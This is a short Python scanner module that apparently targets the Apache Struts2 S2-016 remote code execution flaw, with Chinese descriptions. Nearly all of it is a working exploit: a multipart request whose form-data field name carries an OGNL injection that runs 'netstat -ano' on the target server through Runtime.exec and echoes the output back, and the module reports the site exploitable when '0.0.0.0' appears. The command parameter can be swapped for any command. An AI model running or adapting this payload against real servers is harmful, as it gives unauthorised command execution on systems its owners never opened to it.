#! /usr/bin/env python
#coding:utf-8
import requests

author = ""
scope = ""
description = "Struts2 远程代码执行漏洞"
reference = ""
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def struts2_016_multipart_formdata__special(URL):
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Connection": " Keep-Alive",
        "Cookie": "",
        "Content-Type": "multipart/form-data; boundary=------------------------4a606c052a893987",
    }
    exp = '''--------------------------4a606c052a893987\r\nContent-Disposition: form-data; name="method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&cmd=netstat -ano&pp=\\A&ppp= &encoding=UTF-8"\r\n\r\n-1\r\n--------------------------4a606c052a893987--'''

    try:
        resp = requests.post(URL, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-016 存在利用"
    except:
        return None
    return None